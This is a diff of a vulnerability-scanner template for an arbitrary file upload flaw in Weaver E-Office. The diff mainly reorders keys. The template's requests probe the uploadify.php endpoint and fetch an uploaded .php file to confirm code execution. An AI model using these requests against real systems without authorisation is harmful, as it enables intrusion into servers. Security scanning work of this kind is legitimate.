@@ -1,5 +1,4 @@
 id: weaver-jquery-file-upload
-
 info:
   name: OA E-Office jQuery - Arbitrary File Upload
   author: SleepingBag945
@@ -11,17 +10,30 @@ info:
     cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
-    verified: true
+    fofa-query: app="泛微-EOffice"
     max-request: 3
+    product: e-office
     vendor: weaver
-  tags: weaver,e-office,oa,instrusive,rce,intrusive,vuln
-
+    verified: true
+  tags: e-office,instrusive,intrusive,oa,rce,vuln,weaver
 variables:
-  filename: "{{to_lower(rand_base(5))}}"
-  string: "{{randstr}}"
-
+  filename: '{{to_lower(rand_base(5))}}'
+  string: '{{randstr}}'
 http:
-  - raw:
+  - extractors:
+      - internal: true
+        name: attachmentID
+        regex:
+          - '[0-9]{10}'
+        type: regex
+    matchers:
+      - condition: and
+        dsl:
+          - status_code_1 == 200
+          - status_code_3 == 200 && contains(body_3,'{{string}}')
+        type: dsl
+    matchers-condition: and
+    raw:
       - |
         GET /inc/jquery/uploadify/uploadify.php HTTP/1.1
         Host: {{Hostname}}
@@ -42,19 +54,3 @@ http:
       - |
         GET /attachment/{{attachmentID}}/{{filename}}.php HTTP/1.1
         Host: {{Hostname}}
-
-    extractors:
-      - type: regex
-        name: attachmentID
-        internal: true
-        regex:
-          - "[0-9]{10}"
-
-    matchers-condition: and
-    matchers:
-      - type: dsl
-        dsl:
-          - "status_code_1 == 200"
-          - "status_code_3 == 200 && contains(body_3,'{{string}}')"
-        condition: and
-
